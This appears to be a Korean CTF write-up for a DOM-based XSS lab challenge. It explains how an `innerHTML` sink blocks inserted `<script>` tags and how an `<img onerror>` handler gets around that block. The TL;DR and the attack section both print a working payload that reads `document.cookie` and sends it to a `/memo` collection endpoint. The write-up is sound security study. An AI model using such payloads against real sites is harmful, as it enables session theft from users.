---
title: "XSS-2 (DH, B1)"
date: 2026-06-23
draft: false
tags: ["XSS"]
ShowToc: true
---

## TL;DR

- 취약점: `/vuln`이 `param`을 클라이언트 JS가 `innerHTML`로 DOM에 삽입 → DOM-based XSS
- 핵심 트릭: `innerHTML`은 끼워넣은 `<script>`를 실행 안 함 → 이벤트 핸들러(`<img onerror>`)로 우회. 흐름·수신처·통로는 XSS-1과 동일
- 페이로드: `<img src=x onerror="new Image().src='http://127.0.0.1:8000/memo?memo='+document.cookie">`

## 분석

| 엔드포인트 | 동작 |
|---|---|
| `/vuln` | `param`을 `innerHTML`로 DOM에 삽입 |
| `/flag` | `param`을 `/vuln?param=...`로 조립 → FLAG 쿠키 든 봇(Selenium)이 방문 |
| `/memo` | `memo`를 전역변수 `memo_text`에 누적 저장·노출 |

```html
<div id='vuln'></div>
<script>
  var x = new URLSearchParams(location.search);
  document.getElementById('vuln').innerHTML = x.get('param');
</script>
```

## 취약점

`param`을 검증 없이 `innerHTML`에 삽입 → 입력이 글자가 아니라 HTML로 해석됨.
급소: `innerHTML`은 삽입된 `<script>`를 실행하지 않으므로 XSS-1의 `<script>` 페이로드는 그대로 안 통함 → 이벤트 핸들러 태그로 우회해야 함.

## 공격

흐름은 XSS-1과 동일(봇 호출 → `/vuln` 실행 → 쿠키 읽기 → `/memo` 전송 → 공격자 확인). 갈리는 건 sink 하나.

1. `/flag`에 페이로드 제출 → 봇 호출
2. 봇이 `/vuln?param=페이로드` 방문 → `innerHTML` 삽입 시 코드 실행
3. `<script>`가 막히므로 삽입 즉시 브라우저가 JS를 실행하는 핸들러 사용: `<img src=x onerror=...>` — `src=x`는 로드 실패 → error 이벤트 → `onerror`의 JS 자동 실행
4. 본문은 XSS-1과 동일(`new Image().src`로 쿠키를 `/memo`에 전송)
5. 공격자가 `/memo`를 열어 FLAG 확인

```html
<img src=x onerror="new Image().src='http://127.0.0.1:8000/memo?memo='+document.cookie">
```

검증은 쪼개서: `<img src=x onerror=alert(1)>`(핸들러 실행) → `memo=test`(전송 통로) → `document.cookie`(탈취). `/flag`는 good/wrong만 주고 에러도 막혀 있어 로컬 `/vuln`에서 먼저 터뜨리는 게 유일한 디버깅 수단.

> 핵심 당위: `innerHTML`로 나중에 끼운 `<script>`는 DOM에 생성되되 실행이 차단된다(HTML5: 파싱 중 만난 `<script>`만 실행). 그래서 처음부터 정상 HTML 속성인 `onerror`로 우회 — 차단 규칙이 걸리지 않는다.

## 배운 점

- XSS-1과 결함의 본질(입력이 HTML로 해석)·목표(봇 쿠키 탈취)·유출 통로(`/memo`+`new Image`)는 전부 동일 → 사실상 같은 문제
- 갈리는 단 하나는 sink: 서버 출력/`document.write`는 `<script>` 실행, `innerHTML`은 `<script>` 차단 → 이벤트 핸들러(`<img onerror>`) 필요
- 판별점: "`param`이 어떤 sink로 DOM에 들어가는가"가 페이로드 형태를 통째로 결정 → 같은 XSS라도 sink부터 확인하는 게 첫 분기점
- XSS-1과 묶어 "같은 결함, 다른 sink"의 대조 쌍으로 기억